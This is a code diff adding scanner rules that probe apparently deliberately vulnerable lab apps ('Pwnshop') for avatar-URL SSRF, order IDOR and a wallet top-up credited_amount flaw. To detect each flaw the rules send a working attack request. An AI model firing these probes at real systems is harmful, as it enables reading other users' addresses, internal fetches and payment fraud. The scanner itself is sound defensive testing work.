@@ -28405,6 +28405,158 @@ const pwnshopDownloadPathTraversalRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const PWNSHOP_AVATAR_SSRF_PROBE_URL = "https://example.com/";
+
+const pwnshopAvatarUrlSsrfLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const updateUrl = new URL("/profile/update-avatar", ctx.origin).toString();
+  const doc = await ctx.probe.get(updateUrl, {
+    method: "POST",
+    body: JSON.stringify({ avatar_url: PWNSHOP_AVATAR_SSRF_PROBE_URL }),
+    headers: { "Content-Type": "application/json", Cookie: cookie },
+    maxBytes: 4096,
+    timeoutMs: 20000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!/"ok"\s*:\s*true/i.test(doc.body)) return NEGATIVE;
+  if (!/"fetched"\s*:\s*"/i.test(doc.body)) return NEGATIVE;
+  if (!/Example Domain|example\.com/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: updateUrl,
+      probeUrl: PWNSHOP_AVATAR_SSRF_PROBE_URL,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Pwnshop POST /profile/update-avatar fetches attacker-controlled avatar_url server-side and returns fetched body — avatar URL SSRF (PWN-029)"
+    }
+  };
+};
+
+const pwnshopAvatarUrlSsrfRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/profile\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopAvatarUrlSsrfLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /profile route scan — POST /profile/update-avatar server-side fetches avatar_url and echoes response (PWN-029)"
+    }
+  };
+};
+
+const pwnshopOrderIdorLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const orderUrl = new URL("/order/1", ctx.origin).toString();
+  const doc = await ctx.probe.get(orderUrl, {
+    maxBytes: 65536,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/Order\s*#1/i.test(doc.body)) return NEGATIVE;
+  const addressMatch = doc.body.match(/Shipping Address[\s\S]{0,120}?<p>([^<]{10,})<\/p>/i);
+  if (!addressMatch) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: orderUrl,
+      shippingAddress: addressMatch[1].trim().slice(0, 120),
+      snippet: addressMatch[0].slice(0, 160),
+      note: "Pwnshop GET /order/1 returns another user's order details and shipping address for a freshly registered buyer — order details IDOR (PWN-001)"
+    }
+  };
+};
+
+const pwnshopOrderIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/order\/\d+/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopOrderIdorLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /order/:id route scan — authenticated buyer reads order #1 shipping address without ownership check (PWN-001)"
+    }
+  };
+};
+
+const pwnshopWalletTopupVulnbankLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const profileUrl = new URL("/profile", ctx.origin).toString();
+  const profileDoc = await ctx.probe.get(profileUrl, {
+    maxBytes: 65536,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (profileDoc.status < 200 || profileDoc.status >= 400) return NEGATIVE;
+  if (!/wallet\/topup\/vulnbank/i.test(profileDoc.body)) return NEGATIVE;
+  const topupUrl = new URL("/wallet/topup/vulnbank", ctx.origin).toString();
+  const topupDoc = await ctx.probe.get(topupUrl, {
+    method: "POST",
+    body: "amount=100&credited_amount=50000&card_number=4111111111111111&card_expiry=12/30&card_cvv=123&card_name=Thugir",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 30000,
+    redirect: "manual"
+  });
+  if (![301, 302, 303, 307, 308].includes(topupDoc.status)) return NEGATIVE;
+  const location = decodeURIComponent(topupDoc.headers["location"] || "");
+  if (/Vulnbank is not configured/i.test(location)) return NEGATIVE;
+  const walletOk =
+    /wallet_success=/i.test(location) ||
+    /wallet_error=Payment(?:%20| )declined/i.test(location) ||
+    /wallet_error=Vulnbank charge was not settled/i.test(location);
+  if (!walletOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: /wallet_success=/i.test(location) ? 0.94 : 0.91,
+    evidence: {
+      profileUrl,
+      topupUrl,
+      redirectLocation: location.slice(0, 200),
+      creditedAmountProbe: 50000,
+      note: "Pwnshop POST /wallet/topup/vulnbank accepts credited_amount with Vulnbank card funding wired — wallet top-up business-logic oracle (PWN-042 family)"
+    }
+  };
+};
+
+const pwnshopWalletTopupRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:wallet|profile)\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopWalletTopupVulnbankLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /wallet or /profile route scan — Vulnbank wallet top-up accepts credited_amount parameter (PWN-042 family)"
+    }
+  };
+};
+
 const fauxbankProfileSensitiveDataLiveOracle: Rule = async (ctx) => {
   if (!looksLikeFauxbankLab(ctx.origin, ctx.combined, ctx.scanUrl)) return NEGATIVE;
   const cookie = await ensureFauxbankSession(ctx);
@@ -46443,6 +46595,12 @@ export const RULES: Record<string, Rule> = {
   pwnshopDownloadPathTraversalLiveOracle,
   pwnshopSellerPreviewSstiRouteLiveOracle,
   pwnshopDownloadPathTraversalRouteLiveOracle,
+  pwnshopAvatarUrlSsrfLiveOracle,
+  pwnshopAvatarUrlSsrfRouteLiveOracle,
+  pwnshopOrderIdorLiveOracle,
+  pwnshopOrderIdorRouteLiveOracle,
+  pwnshopWalletTopupVulnbankLiveOracle,
+  pwnshopWalletTopupRouteLiveOracle,
   fauxbankLoansRouteLiveOracle,
   fauxbankTransferRouteLiveOracle,
   fauxbankAccountsRouteLiveOracle,
